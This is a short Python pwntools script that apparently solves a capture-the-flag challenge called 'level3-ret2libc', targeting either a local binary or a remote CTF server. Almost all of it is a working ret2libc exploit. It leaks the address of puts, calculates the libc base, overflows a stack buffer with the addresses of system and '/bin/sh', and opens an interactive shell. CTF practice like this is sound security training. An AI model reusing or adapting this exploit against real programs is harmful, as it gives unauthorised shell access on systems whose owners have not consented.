#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2019 vam <jpwan21@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *

context.log_level = "debug"
pwn_file="./level3-ret2libc"
elf=ELF(pwn_file)

context.arch='i386'
if context.arch=='i386':
    #添加环境变量, 改变所起本地进程libc
    os.environ['LD_LIBRARY_PATH'] = '/home/vam/glibc/i386/'
    print 'yes'
    libc=ELF("/home/vam/glibc/i386/libc.so.6")
elif context.arch=='amd64':
    os.environ['LD_LIBRARY_PATH'] = '/home/vam/glibc/amd64/'
    libc=ELF("/home/vam/glibc/amd64/libc.so.6")

if len(sys.argv) == 1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team",22003)
    pid=0


def debug():
    log.debug("process pid:%d"%pid)
    pause()

r.recvline()
w = r.recvline()
print w
puts_addr = w.split()[4]
print puts_addr
puts_addr = int(puts_addr, 16)
print hex(puts_addr)
libc.address = puts_addr - libc.sym['puts']
print hex(libc.address)

system = libc.sym['system']
binsh = list(libc.search("/bin/sh"))[0]
payload = "a"*0x28 + 'a'*4 + p32(system) + p32(0) + p32(binsh) 
r.sendline(payload)
r.interactive()
